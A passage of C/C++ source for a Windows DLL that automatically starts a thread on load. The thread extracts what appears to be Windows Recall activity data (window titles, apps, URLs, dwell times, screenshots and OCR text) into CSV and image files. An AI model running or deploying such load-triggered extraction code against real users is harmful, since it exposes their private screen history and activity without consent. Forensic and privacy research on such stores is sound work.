              if (me2) SehCount(me2, 7, &restoreCap); }

            // IMemoryEntity3: dwell times
            UINT64 appDwell = 0, webDwell = 0;
            { void* me3 = NULL; SehQI(ent, IID_ME3, &me3);
              if (me3) { SehGetU64(me3, 6, &appDwell); SehGetU64(me3, 7, &webDwell); } }

            bool gotImg = ExtractScreenshot(me, nMeta-1, imgDir, thumbDir);
            if (gotImg) nImg++;

            OcrResult ocrRes = ExtractOcr(ce2, ent, cid, nMeta-1, imgDir, title, app, ocr);
            if (ocrRes.gotOcr) nOcr++;

            WriteCsvRow(csv, nMeta-1, title, app, appModelId, proc, domain, url, furi,
                ts, cid, bounds, appDwell, webDwell, restoreCap,
                ocrRes.nerCount, ocrRes.l1Act, gotImg, ocrRes.gotOcr);
            if (nMeta % 5 == 0)
                Log("  [progress] meta=%d img=%d ocr=%d total=%u\n", nMeta, nImg, nOcr, nIds);
        }

        Log("  [progress] meta=%d img=%d ocr=%d total=%u\n", nMeta, nImg, nOcr, nIds);
        if (fresh == 0 && round > 0) break;
    }

    HeapFree(GetProcessHeap(), 0, ids);
    HeapFree(GetProcessHeap(), 0, done);
    if (ocr) fclose(ocr);
    if (csv) fclose(csv);

    Log("\n========================================\n");
    Log("EXTRACTION COMPLETE\n");
    Log("Entities: %d | OCR: %d | Screenshots: %d\n", nMeta, nOcr, nImg);
    Log("Output: %ls\n", g_outDir);
    Log("========================================\n");
    if (g_log) fclose(g_log);
    return 0;
}

// --- DLL entry ---

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_hMod = h;
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, ExtractThread, NULL, 0, NULL);
    }
    return TRUE;
}
